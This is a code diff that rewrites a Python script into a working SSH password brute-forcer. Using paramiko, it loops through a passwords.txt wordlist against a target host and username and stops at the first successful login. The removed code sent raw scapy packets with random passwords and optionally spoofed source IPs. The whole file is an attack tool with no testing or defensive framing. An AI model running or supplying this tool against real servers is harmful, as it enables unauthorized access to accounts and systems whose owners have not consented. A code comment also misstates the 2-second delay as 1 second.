@@ -1,47 +1,39 @@
-import socket
+import os
 import paramiko
-import random
-import string
 import time
-from scapy.all import *
 
-def generate_random_password(length=8):
-    characters = string.ascii_letters + string.digits + string.punctuation
-    return ''.join(random.choice(characters) for i in range(length))
-
-def send_ssh_packet(destination, source, username, password):
-    packet = IP(src=source, dst=destination)/TCP(dport=22)/Raw(load=f"{username}\r\n{password}\r\n")
-    send(packet, verbose=0)
-
-def get_local_ip():
+def ssh_brute_force(hostname, username, password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        # Create a socket to determine the local IP address
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            s.connect(('8.8.8.8', 80))  # Connect to a known external server
-            local_ip = s.getsockname()[0]
-        return local_ip
+        ssh.connect(hostname, username=username, password=password, timeout=5, banner_timeout=200)
+        print(f"Successfully logged in: {username}@{hostname} with password: {password}")
+        ssh.close()
+        return True
+    except paramiko.AuthenticationException:
+        print(f"Failed to log in: {username}@{hostname} with password: {password}")
+        return False
     except Exception as e:
-        print(f"Error getting local IP address: {e}")
-        return None
+        print(f"Error: {str(e)}")
+        return False
 
-def get_user_input():
-    hostname = input("Enter the hostname or IP address of the SSH server: ")
-    username = input("Enter the username: ")
-    source_ip = input(f"Enter the source IP address (leave blank for default, your local IP address is {get_local_ip()}): ")
-    return hostname, username, source_ip
+def main():
+    hostname = input("Enter the target hostname or IP address: ")
+    username = input("Enter the username to brute force: ")
+    password_file = os.path.join(os.path.dirname(__file__), "passwords.txt")
+
+    if not os.path.isfile(password_file):
+        print("Error: Password file 'passwords.txt' not found in the same directory.")
+        return
+
+    with open(password_file, 'r') as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()  # Remove leading/trailing whitespaces
+        if ssh_brute_force(hostname, username, password):
+            break
+        time.sleep(2)  # Add a 1-second delay between each attempt
 
 if __name__ == "__main__":
-    hostname, username, source_ip = get_user_input()
-
-    while True:
-        if source_ip == "":
-            source_ip = get_local_ip()  # Set source IP to local IP for default behavior
-
-        password = generate_random_password()
-        try:
-            send_ssh_packet(hostname, source_ip, username, password)
-            print(f"SSH packet sent with source IP {source_ip or 'default'} and password: {password}")
-        except Exception as e:
-            print(f"Failed to send SSH packet with password: {password}, Error: {e}")
-        
-        time.sleep(1)  # Adjust sleep time as needed to control the rate of connection attempts
+    main()
